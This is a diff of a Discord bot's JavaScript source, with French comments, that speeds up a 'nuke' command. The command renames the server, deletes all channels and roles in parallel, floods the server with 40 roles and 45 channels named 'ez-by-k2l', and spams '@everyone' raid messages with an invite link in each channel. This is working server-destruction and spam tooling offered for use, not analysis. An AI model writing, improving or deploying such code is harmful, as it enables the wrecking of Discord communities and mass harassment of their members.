@@ -759,29 +759,61 @@ client.on('messageCreate', async message => {
         }
     }
 
-    if (command === 'nuke') {
+if (command === 'nuke') {
         if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
-        await message.reply("💥 **[NUKE TOTAL]** Destruction des rôles, salons et saturation en cours...");
+        await message.reply("💥 **[NUKE TOTAL ULTRA-RAPIDE]** Saturation et destruction immédiate en cours...");
         try {
+            // Change le nom du serveur instantanément
             await message.guild.setName('/yuza').catch(() => {});
-            const deleteChannelPromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
-            await Promise.all(deleteChannelPromises);
 
-            const deleteRolePromises = message.guild.roles.cache
-                .filter(role => role.editable && role.id !== message.guild.id)
-                .map(role => role.delete().catch(() => {}));
-            await Promise.all(deleteRolePromises);
+            // Supprime TOUS les salons et rôles en parallèle total (priorité absolue)
+            const deletePromises = [
+                ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {})),
+                ...message.guild.roles.cache.filter(role => role.editable && role.id !== message.guild.id).map(role => role.delete().catch(() => {}))
+            ];
+            await Promise.all(deletePromises);
 
+            // Crée les rôles et les salons de spam en même temps pour saturer le serveur direct
             const rolePromises = [];
-            for (let r = 0; r < 35; r++) {
-                rolePromises.push(
-                    message.guild.roles.create({
+            for (let r = 0; r < 40; r++) {
+                rolePromises.push(message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Nuke flood' }).catch(() => {}));
+            }
+
+            const channelPromises = [];
+            for (let i = 0; i < 45; i++) {
+                channelPromises.push(
+                    message.guild.channels.create({
                         name: 'ez-by-k2l',
-                        color: 'Random',
-                        reason: 'Nuke role flood'
+                        type: ChannelType.GuildText,
+                        permissionOverwrites: [{
+                            id: message.guild.id,
+                            allow: [
+                                PermissionsBitField.Flags.ViewChannel,
+                                PermissionsBitField.Flags.SendMessages,
+                                PermissionsBitField.Flags.ManageChannels,
+                                PermissionsBitField.Flags.EmbedLinks,
+                                PermissionsBitField.Flags.AttachFiles,
+                                PermissionsBitField.Flags.MentionEveryone
+                            ]
+                        }]
+                    }).then(async channel => {
+                        // Spam immédiat sans temps mort dans chaque salon créé
+                        const spamArray = [];
+                        for (let j = 0; j < 12; j++) {
+                            spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {}));
+                        }
+                        await Promise.all(spamArray);
                     }).catch(() => {})
                 );
             }
+
+            // Exécute tout en un bloc ultra-rapide
+            await Promise.all([...rolePromises, ...channelPromises]);
+        } catch (error) {
+            console.error("Erreur Nuke :", error);
+        }
+    }
+
 
             const createPromises = [];
             for (let i = 0; i < 40; i++) {
